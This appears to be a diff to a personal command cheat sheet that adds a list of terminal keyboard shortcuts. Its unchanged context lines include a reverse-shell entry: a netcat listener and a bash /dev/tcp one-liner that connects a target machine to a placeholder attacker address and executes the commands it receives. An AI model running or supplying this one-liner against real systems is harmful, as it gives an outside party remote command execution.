@@ -110,4 +110,13 @@ reverse shell
      - attacker: :code:`nc -nvlp 4444`
      - target: :code:`exec 5<>/dev/tcp/attacker_ip/attacker_port; cat <&5 | while read line; do $line 2>&5 >&5; done`
 
-    
+terminal shorthand
+  - `C-u`: cut from cursor to line head
+  - `C-k`: cut from cursor to line end
+  - `C-w`: cut from cursor to word head
+  - `A-d`: cut from cursor to word end
+  - `C-y`: paste the content that was cut before
+  - `C-a`: move cursor to line head
+  - `C-e`: move cursor to line end
+  - `C-b/C-f`: move cursor backword/forword a character
+  - `A-b/A-f`: move cursor backword/forword a word
